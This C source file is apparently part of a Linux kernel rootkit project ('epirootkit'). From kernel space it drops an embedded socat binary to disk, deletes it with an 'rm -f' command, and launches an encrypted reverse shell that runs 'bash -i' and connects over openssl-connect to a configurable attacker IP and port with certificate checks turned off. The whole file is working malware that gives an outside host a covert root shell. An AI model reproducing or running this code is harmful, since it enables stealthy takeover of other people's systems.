#include "socat.h"

#include <linux/completion.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "epirootkit.h"

/**
 * Checks if the socat binary has been dropped (exists at SOCAT_BINARY_PATH).
 * @return true if the socat binary exists at the specified path, false otherwise.
 */
static int is_socat_binaire_dropped(void) {
    struct file *f;
    f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
    if (IS_ERR(f))
        return false;
    filp_close(f, NULL);
    return true;
}

/**
 * Drops the socat binary at the specified path.
 * @return SUCCESS on success, negative error code on failure.
 */
int drop_socat_binaire(void) {
    if (is_socat_binaire_dropped()) {
        DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
        return SUCCESS;
    }

    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        ERR_MSG("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    unsigned int written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        ERR_MSG("drop_socat_binaire: kernel_write failed: %u\n", written);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else if (written < socat_len) {
        ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written,
                socat_len);
        filp_close(f, NULL);
        return -FAILURE;
    }
    else {
        DBG_MSG("socat written successfully (%u bytes)\n", written);
    }

    filp_close(f, NULL);

    return SUCCESS;
}

/**
 * Removes the socat binary from the specified path.
 * @return SUCCESS on success, negative error code on failure.
 */
int remove_socat_binaire(void) {
    exec_str_as_command("rm -f " SOCAT_BINARY_PATH, false);
    if (is_socat_binaire_dropped()) {
        ERR_MSG("remove_socat_binaire: failed to remove socat binary\n");
        return -FAILURE;
    }
    DBG_MSG("remove_socat_binaire: socat binary removed successfully\n");
    return SUCCESS;
}

// Function to launch the reverse shell
int launch_reverse_shell(char *args) {
    if (!is_socat_binaire_dropped()) {
        ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
        return -FAILURE;
    }

    int port = REVERSE_SHELL_PORT; // Default port

    // Get the port
    if (args && strlen(args) > 0)
        port = simple_strtol(args, NULL, 10);

    // Build the socat command with the specified port
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
             "%s exec:'bash -i',pty,stderr,setsid,sigint,sane "
             "openssl-connect:%s:%d,verify=0 &",
             SOCAT_BINARY_PATH, ip, port);

    // Launch the command
    int ret_code = exec_str_as_command_no_timeout(cmd, false);

    if (ret_code < 0) {
        ERR_MSG("launch_reverse_shell: failed to start reverse shell on port %d\n",
                port);
        return ret_code;
    }

    DBG_MSG("launch_reverse_shell: reverse shell started on port %d\n", port);
    return SUCCESS;
}
